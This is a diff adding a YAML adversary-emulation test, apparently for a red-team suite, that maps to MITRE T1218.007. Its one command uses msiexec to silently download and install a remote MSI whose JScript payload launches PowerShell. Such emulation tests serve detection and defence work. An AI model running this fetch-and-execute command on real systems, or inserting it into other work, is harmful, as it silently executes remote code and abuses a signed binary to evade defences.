@@ -1,0 +1,12 @@
+- id: 15a81eb7-f459-520c-91a8-eeabdd42ed47
+  name: Soumaia ART Tests - Msiexec.exe - Execute Remote MSI file
+  description: Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI executes a built-in JScript payload that launches powershell.exe.
+  tactic: stealth
+  technique:
+    attack_id: T1218.007
+    name: 'Signed Binary Proxy Execution: Msiexec'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          c:\windows\system32\msiexec.exe /q /i "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi"
